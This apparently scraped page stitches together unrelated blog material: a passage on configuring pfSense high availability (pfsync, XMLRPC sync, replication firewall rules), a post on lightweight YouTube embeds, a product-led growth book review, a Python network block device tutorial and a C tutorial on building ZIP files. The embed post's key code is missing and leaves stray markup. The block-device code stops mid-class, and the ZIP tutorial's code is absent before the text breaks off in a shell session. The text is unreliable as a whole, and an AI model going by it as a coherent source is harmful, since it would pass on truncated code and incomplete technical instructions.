<p>If an IPsec tunnel is configured on the pfSense, it is necessary to modify the IPsec VPN listening interface (normally “WAN”) to replace it with the VIP address (192.168.1.100).<br>This modification is done in VPN &gt; IPsec, then in the phase 1 part.</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-ipsec-configuration-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-ipsec-configuration-pfsense-provya.png 474w, https://www.provya.com/blog/wp-content/uploads/2020/10/carp-ipsec-configuration-pfsense-provya-300x177.png 300w" sizes="(max-width: 474px) 100vw, 474px"><figcaption>[pfSense] Listening interface on IPsec – phase 1 configuration page</figcaption></figure></div>

<p>We have cover the main services impacted with virtual IPs.</p>



<h2>3. Configuring the High Availability</h2>



<p>We still have to configure the high availability service.</p>



<p>Go to System &gt; High Avail. Sync:</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/menu-system-high-availability-sync-pfsense-provya.png" alt=""><figcaption>[pfSense] System &gt; High Avail. Sync</figcaption></figure></div>



<p>On this page there are two things to configure: <strong>pfsync</strong> (states synchronization) and <strong>XMLRPC Sync</strong> (configuration synchronization).</p>



<h3><span>State Synchronization Settings (pfsync)</span></h3>



<p>The fields to be filled in are the following:</p>



<ul><li><strong><u>Synchronize States</u></strong>: check this case to activate pfsync.</li><li><strong><u>Synchronize Interface</u></strong>: if you don’t have a dedicated interface for the synchronization between the two nodes, just choose “LAN”. That’s what we do in our case.</li><li><strong><u>pfsync Synchronize Peer IP</u></strong>: the IP address of the pfSense B. In our case: 192.168.99.2</li></ul>



<h3><span>Configuration Synchronization Settings (XMLRPC Sync)</span></h3>



<p>The fields to be filled in are the following:</p>



<ul><li><strong><u>Synchronize Config to IP</u></strong>: on the <strong>primary pfSense</strong> (pfSense A), enter the IP of the secondary pfSense (pfSense B). In our case: <strong>192.168.99.2</strong>. Keep in mind that it must be the same IP that you entered previously in the “pfsync Synchronize Peer IP” field. <strong>This field must be left blank on the secondary pfSense (pfSense B)</strong>.</li><li><strong><u>Remote System Username</u></strong>: on the <strong>primary pfSense</strong> (pfSense A), enter the username to access to the secondary pfSense (pfSense B) – it should be “<strong>admin</strong>” by default. <strong>This field must be left blank on the secondary pfSense (pfSense B)</strong>.</li><li><strong><u>Remote System Password</u></strong>: on the <strong>primary pfSense</strong> (pfSense A), enter the password of the admin account (or the alternate account you chose). <strong>This field must be left blank on the secondary pfSense (pfSense B)</strong>.</li></ul>



<p>Then we check the services we want to synchronize. The default is all services (click the <em>Toggle All</em> button).</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/high-availability-configuration-pfsense-provya-417x1024.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/high-availability-configuration-pfsense-provya-417x1024.png 417w, https://www.provya.com/blog/wp-content/uploads/2020/10/high-availability-configuration-pfsense-provya-122x300.png 122w, https://www.provya.com/blog/wp-content/uploads/2020/10/high-availability-configuration-pfsense-provya.png 532w" sizes="(max-width: 417px) 100vw, 417px"><figcaption>[pfSense] High Availability configuration</figcaption></figure></div>



<p>Once done, click on the “Save” button.</p>



<h3><span>Allow replication flows in the firewall rules</span></h3>



<p>Last thing to do is to authorize the network flows for the replication process.</p>



<p>Go to Firewall &gt; Rules.</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/12/menu-firewall-rules-pfsense-provya.png" alt=""><figcaption>[pfSense] Firewall &gt; Rules</figcaption></figure></div>



<p>There are two network flows to allow:</p>



<ul><li>XML-RPC synchronization which is done on port 443.</li><li>pfsync protocol synchronization.</li></ul>



<p>The easiest way to do is to create an alias with the LAN IP addresses of the two pfSense servers :</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/12/alias-example-cluster-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/12/alias-example-cluster-pfsense-provya.png 351w, https://www.provya.com/blog/wp-content/uploads/2020/12/alias-example-cluster-pfsense-provya-300x128.png 300w" sizes="(max-width: 351px) 100vw, 351px"><figcaption>[pfSense] Example of an alias</figcaption></figure></div>



<p>Then we create a firewall rule with the alias :</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/12/firewall-rule-for-ha-cluster-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/12/firewall-rule-for-ha-cluster-pfsense-provya.png 603w, https://www.provya.com/blog/wp-content/uploads/2020/12/firewall-rule-for-ha-cluster-pfsense-provya-300x53.png 300w" sizes="(max-width: 603px) 100vw, 603px"><figcaption>[pfSense] An easy firewall rule for firewall synchronization</figcaption></figure></div>



<p><strong>Good news. The configuration is done!</strong></p>



<p>We can do some tests…</p>



<p>First of all, at this step, it is important to make a backup of your both pfSense servers (“Diagnostics” &gt; “Backup &amp; Restore”).</p>



<p>Then, to test the proper functioning of the high availability, several tests can be performed. Here are a few examples:</p>



<ul><li>stop the primary pfSense ;</li><li>disconnect the network cable from the LAN or WAN interface of the primary pfSense ;</li><li>disable the CARP service on the primary pfSense (“Status” &gt; “CARP (failover)”) ;</li><li>download a file or launch ping requests when switching from primary to secondary server</li></ul>

<h3><a href="https://rg3.name/202012062121.html">Embedding YouTube videos without making your site fatter</a></h3>
<p>Posted on <time>2020-12-06T21:21Z</time>. Updated on <time>2020-12-08T09:49Z</time>.</p>


<p>Making this site lighter and improving load times for my readers has been a
priority <a href="https://rg3.name/201704241948.html">for some years</a>. I’ve stopped embedding web
fonts, I’ve started using Unicode icons instead of relying on
<a href="https://fontawesome.com/">Font Awesome</a> and I’ve also
<a href="https://rg3.name/201711221902.html">started loading Disqus comments on demand</a>, which also
has a positive impact on the privacy of anyone reading these pages.</p>
<p>However, on a few occasions I’ve wanted to embed a YouTube video in one of the
posts, and I had never realized this can heavily impact page sizes and load
times. Take, for example, the following HTML document.</p>
<div>
<div>
<pre>&lt;html&gt;
&lt;head&gt;&lt;title&gt;Embedded YouTube Video&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;iframe
    width="1280"
    height="720"
    src="https://www.youtube.com/embed/ck7utXYcZng"
    frameborder="0"
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
    allowfullscreen&gt;
&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>
</div>
<p>The <code>iframe</code> code you see above is almost verbatim copied from the code YouTube
gives you when you right-click on the video and select “Copy embed code”. If
you store that document locally and try to open it with Firefox using its
network inspection tool, you’ll discover it attempts to load, as of the time
this text is being written, around 1.84MB of data, and that’s with
<a href="https://github.com/gorhill/uBlock">uBlock Origin</a> blocking some additional
requests. The largest piece of that being YouTube’s base Javascript library.</p>
<p><span><a href="https://rg3.name/img/youtube-embedded-weight.png"><img src="https://rg3.name/img/youtube-embedded-weight-tn.jpg" alt="Firefox network inspection tool showing the base YouTube Javascript library weighting 1.46MB"></a></span></p>
<p>On the one hand, it’s likely many people already have that file, and some
others, in their browser cache. On the other hand, I don’t feel comfortable
making that assumption and throwing my hands up. This prompted me to try to
find a way to embed YouTube videos without adding so much data by default, and
it turns out
<a href="https://css-tricks.com/lazy-load-embedded-youtube-videos/">other people
have found solutions to the problem</a>, which I’ve slightly tuned and I’m
re-sharing here. Instead of using the previous <code>iframe</code> code, I use something
slightly more convoluted.</p>

<p>The first few lines are almost identical up to the <code>src</code> property. I’ve only
added the <code>title</code> property for accessibility reasons. Special care needs to be
taken if the video title contains double quotes or single quotes. The <code>src</code>
property contains the classic URL but it’s only used as a fallback for browsers
that do not support the <code>srcdoc</code> property that starts on the next line.
<code>srcdoc</code> allows you to specify an inline document that will be used instead of
loading the frame from an external URL. Support for it is widespread nowadays.
As you can see, the embedded inline document contains a <code>style</code> element
followed by an <code>a</code> element pointing to the real embedded <code>iframe</code>, only this
time with the <code>autoplay</code> parameter set to 1, so the video will immediately
start playing when the frame is loaded.</p>
<p>The provided style sheet makes sure the link fills the entire embedded
<code>iframe</code>, so clicking anywhere on it loads the video and starts playing it.
Inside the link you’ll find 3 items. The first one is the video thumbnail in
YouTube’s “high quality” version, which is actually lightweight and gets the
job done as the background image. My guess is the name predates HD and FHD
content. On top of that image I’ve placed a <code>span</code> element with a black
background color and 75% opacity that, again, fills the whole <code>iframe</code> and
darkens the background image, making the play button stand out. Finally,
another <code>span</code> element is laid out on top of those, containing the Unicode
character for a triangle pointing to the right in a large font. This serves as
the aforementioned play button and gives readers the visual clue they need to
click on the video to start playing it.</p>
<p>With those changes and for this particular video, the browser only needs to
load around 9KB of data. You can see what it looks like below.</p>
<p>

        </a>"></iframe>
</p>
<p><strong>Edit 2020-12-08</strong>: The <code>autoplay</code> parameter is ignored by YouTube on mobile and
users will need to tap twice to watch the video: once to click on your link and
load the <code>iframe</code> and once more to start playing the video from it. Still, I
think double tapping is worth saving almost 2MB by default. On an iPad I only
need to tap once, so it depends on the exact device and what’s considered
“mobile”.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>We have been reading <a href="https://www.amazon.com/Product-Led-Growth-Build-Product-Itself-ebook/dp/B07P6288ZF/ref=sr_1_1?dchild=1&amp;keywords=product+led+growth&amp;qid=1607309625&amp;sr=8-1"><em>Product Led Growth: How to Build a Product that Sells Itself</em> by Wes Bush</a> as a Product team at <a href="https://www.armor.com/">Armor</a>. Because a team that learns together grows together. For some of us it is the first time reading this book since it was released in 2019 and for others we're re-reading it. But regardless of whether it is the first time through or a repeat read the book is yielding valuable insights and talking points amongst the team. There have been two areas of insights from the product-led growth framework presented in that book that I would like to explore in this blog post from these readings: the first is around the shift companies can take from best guess pricing strategies to value-based pricing for their customers; the second set of insights concerns the impact of a product-led growth strategy on onboarding and user engagement. </p><h2 id="value-based-pricing-strategies-for-saas-companies">Value-Based Pricing Strategies for SaaS companies </h2><figure><img src="https://www.writingbyryan.com/content/images/2020/12/bondsai-value-based-pricing-faq-capture-value.png" alt="" srcset="https://www.writingbyryan.com/content/images/size/w600/2020/12/bondsai-value-based-pricing-faq-capture-value.png 600w, https://www.writingbyryan.com/content/images/size/w1000/2020/12/bondsai-value-based-pricing-faq-capture-value.png 1000w, https://www.writingbyryan.com/content/images/size/w1600/2020/12/bondsai-value-based-pricing-faq-capture-value.png 1600w, https://www.writingbyryan.com/content/images/2020/12/bondsai-value-based-pricing-faq-capture-value.png 1920w" sizes="(min-width: 720px) 720px"><figcaption>Value-Based Pricing</figcaption></figure><p>There have been many articles recently on <a href="https://www.forbes.com/sites/forbestechcouncil/2020/09/23/how-saas-companies-benefit-from-value-based-pricing/?sh=122ae9d21ebe">"How SaaS Companies Benefit from Value-Based Pricing"</a>. Specifically, the above slide on value-based pricing from bondsai.io does a good job of outlining the goal of value-based pricing strategies for companies, to align your price point in market to an area where the company captures market share, substantial revenue, and high profit margins, while the buyer or user gains considerable value for the price and feels as if they have gotten a good deal. This good deal can be measured as product-market fit where a user &nbsp;says they would be upset if they couldn't use your product anymore. TechCrunch described this as "<a href="https://techcrunch.com/2020/12/01/bottom-up-saas-a-framework-for-mapping-pricing-to-customer-value/">Bottom-Up SaaS: A framework for mapping pricing to customer value</a>". I believe the debate between bottom-up versus top-down sales growth is a bit of a misnomer and successful product-led SaaS companies should actually take a cue from Richard Hendricks from <a href="https://www.hbo.com/silicon-valley">HBO's <em>Silicon Valley</em></a> and adopt a middle-out strategy but that's for another post.</p><p>Wes Bush describes the evolutionary path companies go through on pricing as happening in 3 stages. First, companies use a best-guess strategy. This strategy can sometimes look at market guidance such as what competitors are doing but is generally what the founders or executive team feels is the right strategy based on their years of experience inn the industry. While this experience certainly matters to pricing discussions, it cannot be the determining factor in a company's strategy. Second, companies evolve to use cost + margin pricing. This adds a little more quantifiable approach to the strategy for the company as it looks at what it takes to run the business and seeks to add a comfortable profit margin for the company on top. However, this only creates value for the company and not for the customer necessarily. The company may be leaving money on the table because the customer experiences more value from the product than the arbitrary profit margin assigned by the business or the company may be overcharging based on the value the customers receive and start losing deals on price or experiencing increased churn due to perceived value not equating to experienced value. </p><p>The last stage of a companies pricing evolution though takes them to value-based pricing that is the best possible result for both the business and the buyer. The customer gains in whatever value metric they achieve with your product and you gain financially and with sticky users and substantial life-time value (LTV) from your customer base. For example, for social networks such as <a href="https://www.facebook.com/ArmorCloudSec">Facebook</a>, <a href="https://twitter.com/Armor">Twitter</a>, and <a href="https://www.linkedin.com/company/armor-cloud-security/">LinkedIn</a>, as well as workplace communication tools such as Slack the value metric is the number of users on the platform because the platform becomes more valuable to me when I can connect, communicate, and engage with more people. However, charging by user does not necessarily make sense for a cybersecurity company like Armor because the number of users does not affect the value a company receives from using our product. They do, however, get value out of the amount of coverage of their IT estate we can provide them so we can either charged by amount of infrastructure protected or the number of detections with corresponding remediation guidance we can provide in an environment because users get value out of how secure and/or compliant their business becomes when using <a href="https://www.armor.com/armor-anywhere-security/">Armor's security-as-a-service SaaS platform, Armor Anywhere</a>. It is important for companies to think about their pricing strategies using the value-based pricing framework laid out in <em>Product-Led Growth </em>as it will give them a competitive differentiation in market. </p><h2 id="how-onboarding-and-user-engagement-benefit-from-a-product-led-growth-strategy">How Onboarding and User Engagement Benefit from a Product-Led Growth Strategy</h2><figure><img src="https://www.writingbyryan.com/content/images/2020/12/2-product-led-growth-1024x577.png" alt="" srcset="https://www.writingbyryan.com/content/images/size/w600/2020/12/2-product-led-growth-1024x577.png 600w, https://www.writingbyryan.com/content/images/size/w1000/2020/12/2-product-led-growth-1024x577.png 1000w, https://www.writingbyryan.com/content/images/2020/12/2-product-led-growth-1024x577.png 1024w" sizes="(min-width: 720px) 720px"><figcaption>Product-Led Growth and User Experience from PQL to Increasing Customer LTV</figcaption></figure><p>A big part of <em>Product-Led Growth</em> is how companies who adopt this strategy can benefit across the customer lifecycle journey from getting more qualified leads who are likely to spend more with the product to converting those leads into lifelong customers who keep spending and increasing their engagement with the product. It starts by saying companies should use their marketing initiatives to funnel people directly into a free trial or freemium experience of the product and use those initial customer touches with the product to generate product qualified leads (PQLs) that ultimately convert into paying customers. The goal is to cut out the friction of previous software buying experiences...talking to sellers, sitting through demos, getting bombarded by endless marketing content before getting to even try the product. If your product does not make the user feel as if they are getting enough value out of their experience then you have not found product-market fit. If customers do experience value then they'll convert into paying customers. Also, customers are going to try the product eventually, so if they only try after they buy you are likely to see increased churn, bad press or customer reviews, etc when perceived value doesn't equal experienced value. Getting to these insights earlier in the customer lifecycle allows SaaS companies pinpoint which levers they need to pull to achieve product-market fit quicker. </p><p>After the customer is in the product funnel, has experienced a free trial, gotten value out of the product and converted to a paying customer it is the sales, product, and customer success teams duty to keep the user engaged from onboarding through every day usage to ensure that they continue to be successful with the product, see value out of using it, and continue to increase their engagement and spend so the company offering the product also continues to experience value and gain something from the relationship. This often manifests itself in cross-sell and up-sell opportunities and ways for the company to increase MRR and the TLV of a customer. These tactics also help prevent customer churn within a business. The end goal of every business should be that when a customer is using the product, experienced value = perceived value = value-based price-point that makes everyone smile.</p><figure><img src="https://www.writingbyryan.com/content/images/2020/12/5cf9445cd86db995dbdf3688_bowling-alley-framework-2.png" alt="" srcset="https://www.writingbyryan.com/content/images/size/w600/2020/12/5cf9445cd86db995dbdf3688_bowling-alley-framework-2.png 600w, https://www.writingbyryan.com/content/images/size/w1000/2020/12/5cf9445cd86db995dbdf3688_bowling-alley-framework-2.png 1000w, https://www.writingbyryan.com/content/images/2020/12/5cf9445cd86db995dbdf3688_bowling-alley-framework-2.png 1024w" sizes="(min-width: 720px) 720px"><figcaption>Bowling Alley Framework for User Engagement Using Product-Led Growth</figcaption></figure><p>The above diagram is a great example of some of the ways a product-led growth strategies affects what the SaaS product's responsibility and what the Customer Success, Sales, and Marketing teams' responsibility is in affecting user engagement and LTV of their customer base. Businesses should imagine a bowling alley when thinking about how to make customers successful with their product. The goal of bowling is to guide the ball from your hand to the other end of the lane without going in the gutters and simultaneously knocking down as many pins as possible. Similarly, the goal of a product-led business should be to guide their customers (the ball) to the value they seek (the pins) by providing bumpers similar to how bowling lanes provide this assistance to customers who need it. </p><p>The book outlines two ways in which this happens, product bumpers (welcome messages, product tours, progress bars, checklists, tooltips, empty states, etc.) which are primarily the responsibility of the product itself and the product team to maintain and conversational bumpers (user onboarding emails, sales outreach, customer success outreach, direct mail, etc.) which fall to marketing, sales, and customer success generally even though there can be some cross-pollination of team responsibility across both sets of bumpers. The goal of each of the bumper strategy should be to just like bowling bumpers make the customer so confident in their own ability to achieve the value they seek that they no longer need the bumpers and can achieve strikes with your product all on their own. </p><p>By adopting a product-led growth company, SaaS companies can benefit in many areas. It can have transformative effects on areas other business such as pricing, onboarding and user engagement, and product growth. It recognizes that the product is the experience and that experience can drive a lot in terms of corporate strategy for a company. At Armor, we'll be looking to bring these insights into our product management and corporate strategy conversations and continue to look to build paths to value for our customers.

  <p><strong>With Python (30 - 40 mins read time)</strong></p><p>Welcome back to The Lambda Scheme. In our <a href="https://lambdascheme.com/QS.html" target="_blank" rel="noopener">last post</a> we reflected on the long history of classical computing and explored the mysterious new world of quantum algorithms. Now that we’ve amply flexed our philosopher muscles I thought we could spend this post doing something much more practical. We’re going to build some good ol’ cloud infrastructure from scratch. With Python! In particular, we’re going to build a cloud-ready block storage service, like a simplified version of <a href="https://aws.amazon.com/ebs/" target="_blank" rel="noopener">Amazon EBS</a> or <a href="https://wiki.openstack.org/wiki/Cinder" target="_blank" rel="noopener">OpenStack Cinder</a></p><p>Imagine you’re tasked with building Cinder. Where would you start? Building your own version of a system you use regularly is a great way to richen your understanding, both of the system itself and of general systems design principles. For those of you who are interviewing at a big tech co. like any FAANG, this post will follow a very similar flow to the “systems design” section of the interview so it’s good practice.</p><p>In <a href="#part-1-a-single-node-service">Part 1</a> we will learn:</p><ul>
<li>What a <a href="http://pineight.com/ds/block/" target="_blank" rel="noopener">block device</a> is from the perspective of the OS kernel</li>
<li>How we can store and mount an <a href="https://en.wikipedia.org/wiki/Extended_file_system" target="_blank" rel="noopener">extended filesystem</a> on a block device</li>
<li>How to build a simple <a href="https://en.wikipedia.org/wiki/Network_block_device" target="_blank" rel="noopener">Network Block Device</a> as a service</li>
</ul><p>In <a href="#part-2-a-multi-node-service">Part 2</a> we will uplevel our service for cloud scale by:</p><ul>
<li><a href="https://en.wikipedia.org/wiki/Replication_(computing)" target="_blank" rel="noopener">Replicating</a> our data for high availability</li>
<li><a href="https://en.wikipedia.org/wiki/Shard_(database_architecture)" target="_blank" rel="noopener">Sharding</a> our data for high throughput</li>
<li>Adding <a href="https://en.wikipedia.org/wiki/Leader_election" target="_blank" rel="noopener">leader election</a> for automatic failover</li>
</ul><p>Finaly in <a href="#part-3-measuring-performance">Part 3</a> we will see how our system actually performs by:</p><ul>
<li>Using it for a real-world scenario (backing a <a href="https://www.postgresql.org/" target="_blank" rel="noopener">PostgreSQL</a> database)</li>
<li>Adding observability like <a href="https://opentracing.io/" target="_blank" rel="noopener">system metrics</a> and <a href="https://docs.python.org/3/library/logging.html" target="_blank" rel="noopener">logging</a></li>
<li>Benchmarking our service against other block services</li>
</ul><p>Follow along with the source code <a href="https://github.com/ulmenhaus/lambdascheme/tree/master/nbd" target="_blank" rel="noopener">on github</a>. Let’s begin!</p><h2 id="part-1-a-single-node-service"><a href="#part-1-a-single-node-service" title="part-1-a-single-node-service"><i></i></a>Part 1: A Single Node Service</h2><h3 id="the-what-and-why-of-block-devices"><a href="#the-what-and-why-of-block-devices" title="the-what-and-why-of-block-devices"><i></i></a>The What and Why of Block Devices</h3><p>Block devices are the parts of any computer system that make it durable. They store all the state that a computer has when it boots, its operating system, its data, and its programs. Many things can be block devices, <a href="https://github.com/ulmenhaus/lambdascheme/tree/master/nbd" target="_blank" rel="noopener">rotating hard disk drives</a>, <a href="https://en.wikipedia.org/wiki/Solid-state_drive" target="_blank" rel="noopener">solid state drives</a>, older <a href="https://en.wikipedia.org/wiki/Magnetic_tape_data_storage" target="_blank" rel="noopener">magnetic tapes</a>, or whatever. The abstract idea of a “block device” caputres the common features across all these devices namely: they’re cheap, they’re big, and they’re <a href="https://en.wikipedia.org/wiki/Non-volatile_memory" target="_blank" rel="noopener">non-volatile</a>. Cheap and big basically mean the same thing; the cost per bit of a block device is much lower than that of RAM or CPU registers, so we can buy a lot more bits.</p><p>This cheapness and bigness comes at a cost. For <a href="https://en.wikipedia.org/wiki/CAS_latency" target="_blank" rel="noopener">hardware reasons we won’t go into</a>, the more storage a device has the longer it takes to retrieve any one piece of data. For block devices this cost is so high that you only want to pay it to retrieve a large amount of data, called a <strong>block</strong> (hence the name), at a time. Because the whole block is collocated on your storage device you pay the same overhead you would for a single byte but amortized over the size of the block, <a href="https://www.quora.com/What-is-the-block-size-in-unix#:~:text=The%20hardware%20block%20size%20on,be%20subdivided%20into%20512B%20segments." target="_blank" rel="noopener">typically 4KiB</a>.</p><p>One of the jobs of your operating system is to manage these blocks for you so that you, the application programmer don’t need to think about them. Your OS will have a myriad techniques for managing blocks efficiently. It may <a href="https://www.oreilly.com/library/view/understanding-the-linux/0596005652/ch15s01.html#:~:text=The%20page%20cache%20is%20the,from%20or%20writing%20to%20disk.&amp;text=If%20the%20page%20is%20not,data%20read%20from%20the%20disk." target="_blank" rel="noopener">cache them in memory</a> when it anticipates you’ll need them again soon, or it may <a href="https://www.linuxjournal.com/article/6931" target="_blank" rel="noopener">cleverly do disk reads</a> in sequence when it knows the blocks are close to each other on disk. When it comes time to actually retrieve or store your blocks it’s your OS, or more precisely the OS kernel with its privileged hardware access, that issues the request to your hard drive.</p><p><img src="https://storage.googleapis.com/bigendian/scsi.svg"></p><p>A common interface between your kernel and the device here is the <a href="https://en.wikipedia.org/wiki/SCSI" target="_blank" rel="noopener">SCSI</a> (pronounced “scuzzie”) protocol which we’ll meet again when we want to provide blocks as a network service. In short, say your program needs to fetch a block from your hard-drive, then your kernel will issue the drive a SCSI command like “read me block 42” and then copy the block into main memory for your program.</p><p>Blocks are a pain to deal with. They are fixed in size and use otherwise meaningless numbers like <code>0x34586209</code> as addresses. So from the perspective of an application program a kernel provides a more abstract and more friendly “file system” interface.</p><p><img src="https://storage.googleapis.com/bigendian/unix_files.svg"></p><p>With a file system we get a tree of directories and files which get to have meaningful names and can be of arbitrary size. Your kernel then translates operations on these files into storage and retrieval of blocks. As you can imagine, there are infinitely many ways the OS can do this mapping, but over time a handful have emerged as the most common, <a href="https://wiki.archlinux.org/index.php/ext4" target="_blank" rel="noopener">Ext4</a> on Linux, <a href="https://en.wikipedia.org/wiki/NTFS" target="_blank" rel="noopener">NTFS</a> on Windows, and <a href="https://en.wikipedia.org/wiki/Apple_File_System" target="_blank" rel="noopener">APFS</a> on Mac. Let’s look at a simple view of the disk layout for Ext4.</p><p><img src="https://storage.googleapis.com/bigendian/ext4.svg"></p><p>What Linux does is store all key attributes of the file system itself in the first block of the drive, called the super-block. At the other end of the drive we have all our file blocks. These contain the raw contents of individual files and directories. Sandwiched in between the superblock and the file blocks is a collection of <a href="https://en.wikipedia.org/wiki/Inode" target="_blank" rel="noopener">inode</a> blocks.</p><p>Each inode stores metadata about an individual file or directory and can tell you which data blocks make up its contents. Inodes are how the kernel can actually index and assemble file blocks into a single file of arbitrary size. When we zoom into ext4 this process gets quite hairy, but we don’t have to think about that. File systems are built on block devices, so If we implement blocks as a network service we get ext4 for free.</p><p>Finally before starting to write our service let’s briefly understand why we would want network block devices instead of say a <a href="https://en.wikipedia.org/wiki/Network_File_System" target="_blank" rel="noopener">Network Filesystem</a> or blob storage like <a href="https://aws.amazon.com/s3/" target="_blank" rel="noopener">Amazon S3</a>. The truth is our needs depend on our application. For applications like storing photos which would have lots of independent and variably sized files coming in we would in fact want S3 or NFS.</p><p>Other applications like storing relational data in a database, which we’ll do in <a href="#part-3-measuring-performance">Part 3</a>, or even writing NFS itself rely on block storage as a primitive. Databases and file-systems will do lots of in-place block updates, log writing with contiguous blocks, and use ordering guarantees that are really only correct and performant on a block device. You should always take implicit constraints and tradeoffs like these and make them explicit when designing a system. So with our motivation clear let’s start writing our service.</p><h3 id="network-block-devices"><a href="#network-block-devices" title="network-block-devices"><i></i></a>Network Block Devices</h3><p>We’ve seen how your kernel might send SCSI commands over a <a href="https://en.wikipedia.org/wiki/Serial_ATA" target="_blank" rel="noopener">SATA cable</a> when it’s communicating with a physical hard drive. It turns out SCSI is a generic enough protocol that we can use it over the internet as well. In particular if you’ve ever heard of <a href="https://en.wikipedia.org/wiki/ISCSI" target="_blank" rel="noopener">iSCSI</a> (“eye scuzzie”), it’s a way to issue SCSI commands over TCP/IP. The proliferation of SCSI for disk drives is what makes iSCSI so great as a protocol for <a href="https://en.wikipedia.org/wiki/Storage_area_network" target="_blank" rel="noopener">Storage Area Networks</a>.</p><p>Linux also supports another protocol called <a href="https://en.wikipedia.org/wiki/Network_block_device" target="_blank" rel="noopener">NBD</a> (the “no big deal” protocol, obviously). It’s simpler than iSCSI so we can implement a server in about 70 lines of Python but it won’t be as performant. Ah well, worth the tradeoff 🤷 They both in essence do the same thing, store blocks and retrieve blocks. Let’s take a close look <a href="https://github.com/NetworkBlockDevice/nbd/blob/master/doc/proto.md" target="_blank" rel="noopener">at the protocol for NBD</a> and see what behavior we need to support.</p><p>We can break a given NBD session into three parts</p><p><img src="https://storage.googleapis.com/bigendian/nbd_sequence.svg"></p><p>There is the handshake where we establish that the server is an NBD server and the client is an NBD client, the options negotiation where both sides say what optional behavior they support (none for now), and finally the actual transmission phase in which our client will store and fetch blocks. Simple enough. Our protocol also makes use of a handful of <a href="https://en.wikipedia.org/wiki/Magic_number_(programming)" target="_blank" rel="noopener">magic numbers</a>) so I’m gonna start by putting all of these under one class for easy reference</p><pre><code><span>import</span> collections
<span>import</span> socket
<span>import</span> time

DEFAULT_DEVICE_SIZE = (<span>2</span>**<span>19</span>)  


<span><span>class</span> <span>MagicValues</span><span>(object)</span>:</span>
    MinimalClientFlags = <span>b"\x00\x00\x00\x01"</span>  
    OptionRequestPrefix = <span>b"IHAVEOPT"</span>
    OptionResponsePrefix = <span>b"\x00\x03\xe8\x89\x04\x55\x65\xa9"</span>
    OptionsExportName = <span>b"\x00\x00\x00\x01"</span>
    OptionUnsupported = <span>b"\x80\x00\x00\x01"</span>
    RequestPrefix = <span>b"\x25\x60\x95\x13"</span>
    RequestKindRead = <span>b"\x00\x00"</span>
    RequestKindWrite = <span>b"\x00\x01"</span>
    RequestKindClose = <span>b"\x00\x02"</span>
    ResponsePrefix = <span>b"\x67\x44\x66\x98"</span>
</code></pre><p>Next we’ll be clean and break up our code into two tiers. The upper tier will work at the logical level of NBD requests and responses so it can be concerned with the abstract behavior of our service. The lower tier can translate those requests and responses into actual byte sequences over the TCP connection. Such a separation of concerns is typical of network stacks like the <a href="https://en.wikipedia.org/wiki/OSI_model" target="_blank" rel="noopener">OSI model</a>). Let’s define the logical types our lower tier will return as <a href="https://docs.python.org/3/library/collections.html#collections.namedtuple" target="_blank" rel="noopener">named tuples</a>; if you’re unfamiliar with these they’re basically Python’s version of C structs.</p><pre><code>Option = collections.namedtuple(<span>"Option"</span>, (<span>"kind"</span>, <span>"data"</span>))
TransmissionRequest = collections.namedtuple(
    <span>"TransmissionRequest"</span>,
    (<span>"kind"</span>, <span>"handle"</span>, <span>"offset"</span>, <span>"length"</span>, <span>"data"</span>),
)

</code></pre><p>and write a class for our lower tier that will interpret between a raw TCP connection and our logical types</p><pre><code><span><span>class</span> <span>NBDInterpreter</span><span>(object)</span>:</span>
    <span><span>def</span> <span>__init__</span><span>(self, cxn)</span>:</span>

<p>Let's try creating a ZIP file from scratch. Since I'm mostly interested in the layout and meta-data we'll be using the option to add
the files <em>uncompressed</em>. That means I don't have to learn the [deflate] compression algorithm at the same time.
The resulting knowledge is still useful in that it will allow us to bundle a set of files into a single, ubiquitous format.
</p>
<p>unix [cpio] (or even [tar]) would be easier but it's not ubiquitous.... I'm looking at you DOS.
</p>
<p>I'll be using C for this, <s>since it's ubiquitous</s>... since I like it. Also, C is good for the kind of low-level bit manipulation
we'll be doing here.
Even if you don't like C there is still some useful information here about the zip file format.
(I was going to use Common Lisp, but it's not ubiquitous.)
</p>
<p>Useful resources:
</p>
<ul><li>
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)">https://en.wikipedia.org/wiki/ZIP_(file_format)</a>
</li><li>
hexdumping a real zip file
</li></ul>
<h2> simplest zip file</h2>
<p>Zip files are read <em>from the end</em>. This allows the zip file to built in a single pass.
(It also allows some other tricks like prefixing data at the start of a zip file e.g. an executable to unpack the remainder.)
</p>
<p>A zip reader finds the final record by searching backwards for the record's magic number e.g. 0x06054b50
(a record is just a block of bytes in the file).
Every zip file must contain an <code>End of Central Directory Record</code> and the 
simplest zip file consists of only an End of Central Directory Record. That would be an empty zip file, but a zip file nevertheless.
</p>
<p><span>note the mention of disk numbers, this file format was invented back in the days of archives spanning multiple floppy disks.</span>
</p>
<p>The EOCD format is given here.
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)">https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)</a>
</p>
<p>Remember that all integers (including the magic) must be written little-endian (i.e. byte reversed).
I will assume your platform does that automatically since most people will be using an Intel/AMD processor.
(Check the C functions ntohs() and ntohl() if your platform is big endian.)
</p>
<p>This is the C function which will write the EOCD record.
<span>the full code will be linked at the bottom of the article</span>

<p>Build the code and call the program to produce our zip file (on stdout):

$ ./mkzip &gt;ex.zip
$ file ex.zip
ex.zip: Zip archive data (empty)
</pre>
<p>Congratulations! We have created a zip file from scratch. That will be all for today. Thank you for watching...
</p>
<h2> adding some files</h2>
<pre>$ unzip -l ex.zip
Archive:  ex.zip
